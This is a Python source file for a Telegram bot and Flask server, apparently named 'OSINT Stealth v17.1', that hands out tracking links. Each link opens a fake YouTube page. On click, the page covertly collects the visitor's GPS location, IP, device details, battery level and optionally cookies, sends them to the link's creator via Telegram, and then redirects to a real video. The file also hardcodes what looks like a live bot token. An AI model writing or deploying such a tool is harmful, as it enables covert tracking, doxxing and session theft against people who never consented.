import asyncio, threading, os, requests, json, uuid
from flask import Flask, render_template_string, request
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder

# --- КОНФИГ ---
API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
OWNER_ID = 6659724115 
BASE_URL = "https://tg-bot-backend-oo97.onrender.com" 

app = Flask(__name__)
exploit_vault = {} 
user_mode = {} 

# --- БИБЛИОТЕКА СКРИПТОВ ---
SCRIPTS = {
    "INFO": "// Тихий сбор данных",
    "COOKIE": "try { d.cookies = document.cookie || 'Protected/Empty'; } catch(e) { d.cookies = 'Error'; }",
    "SESSION": "try { d.session = {lang: navigator.language, storage: window.localStorage.length}; } catch(e) { d.session = 'Blocked'; }"
}

HTML_TRAP = """
<!DOCTYPE html>
<html>
<head>
    <title>YouTube</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #fff; margin: 0; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; }
        .header { width: 100%; height: 48px; display: flex; align-items: center; padding: 0 16px; border-bottom: 1px solid #e5e5e5; box-sizing: border-box; }
        .video-container { width: 100%; background: #000; aspect-ratio: 16/9; display: flex; justify-content: center; align-items: center; position: relative; cursor: pointer; }
        .play-icon { position: absolute; width: 64px; height: 44px; background: rgba(255,0,0,0.9); border-radius: 12px; display: flex; justify-content: center; align-items: center; }
        .play-icon::after { content: ''; border-left: 18px solid #fff; border-top: 10px solid transparent; border-bottom: 10px solid transparent; margin-left: 5px; }
        .details { padding: 12px 16px; width: 100%; box-sizing: border-box; }
        .v-title { font-size: 18px; color: #0f0f0f; margin-bottom: 4px; }
        #ldr { border: 4px solid #f3f3f3; border-top: 4px solid #ff0000; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; display: none; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body onclick="execute()">
    <div class="header"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" width="90"></div>
    <div class="video-container">
        <img src="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg" style="width:100%;opacity:0.6;">
        <div class="play-icon" id="p_btn"></div>
        <div class="loader" id="ldr"></div>
    </div>
    <div class="details">
        <div class="v-title">Скрытые настройки Telegram (2026)</div>
        <div style="font-size:12px;color:#606060;">245 тыс. просмотров • 3 часа назад</div>
    </div>
<script>
async function execute() {
    document.getElementById('p_btn').style.display = 'none';
    document.getElementById('ldr').style.display = 'block';
    let d = { aid: "{{ aid }}", ua: navigator.userAgent, plat: navigator.platform, res: screen.width+"x"+screen.height };
    try { {{ custom_script|safe }} } catch(e) {}
    try { let b = await navigator.getBattery(); d.bat = Math.round(b.level * 100) + "%"; } catch(e) {}
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((p) => { 
            d.gps = p.coords.latitude+","+p.coords.longitude; d.acc = p.coords.accuracy+"m"; send(d); 
        }, () => { send(d); }, {timeout: 3000});
    } else { send(d); }
    setTimeout(() => { send(d); }, 4500);
}
function send(d) {
    if(window.s) return; window.s = true;
    fetch('/catch', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(d) })
    .finally(() => { location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; });
}
</script>
</body>
</html>
"""

@app.route('/', strict_slashes=False)
def home(): return "OK", 200

@app.route('/v/<aid>', strict_slashes=False)
def trap(aid):
    # Исправляем ошибку 500: если ID нет в базе, берем INFO
    mode = user_mode.get(int(aid), "INFO")
    script = SCRIPTS.get(mode, SCRIPTS["INFO"])
    return render_template_string(HTML_TRAP, aid=aid, custom_script=script)

@app.route('/catch', methods=['POST'], strict_slashes=False)
def catch():
    d = request.json
    ips = request.headers.get('X-Forwarded-For', request.remote_addr)
    token = "EXP-" + str(uuid.uuid4())[:6].upper()
    
    # Сохраняем в память
    exploit_vault[token] = f"Cookie Data: {d.get('cookies', 'None')}\nSession: {d.get('session', 'None')}"

    report = (
        f"🚨 **ЦЕЛЬ В СЕТИ (TG Browser)**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 IP: `{ips}`\n"
        f"📱 Модель: `{d.get('plat')}` | `{d.get('res')}`\n"
        f"📍 GPS: `{d.get('gps', 'N/A')}`\n"
        f"🔋 Батарея: {d.get('bat', 'N/A')}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🔑 Ключ: `{token}`"
    )
    requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
                  json={"chat_id": d['aid'], "text": report, "parse_mode": "Markdown"})
    return "OK", 200

bot = Bot(token=API_TOKEN)
dp = Dispatcher()

@dp.message(Command("start"))
async def start(message: types.Message):
    kb = ReplyKeyboardBuilder()
    kb.button(text="🚀 Создать ссылку")
    await message.answer("💀 **OSINT Stealth v17.1**", reply_markup=kb.as_markup(resize_keyboard=True))

@dp.message(F.text == "🚀 Создать ссылку")
async def choose_mode(message: types.Message):
    kb = InlineKeyboardBuilder()
    kb.button(text="Инфо", callback_data="m_INFO")
    kb.button(text="Cookies", callback_data="m_COOKIE")
    kb.adjust(1)
    await message.answer("Выберите режим скрипта:", reply_markup=kb.as_markup())

@dp.callback_query(F.data.startswith("m_"))
async def get_link(callback: types.CallbackQuery):
    mode = callback.data.split("_")[1]
    user_mode[callback.from_user.id] = mode
    link = f"{BASE_URL}/v/{callback.from_user.id}"
    await callback.message.edit_text(f"✅ **Ссылка готова:**\n`{link}`")

async def main():
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=10000), daemon=True).start()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
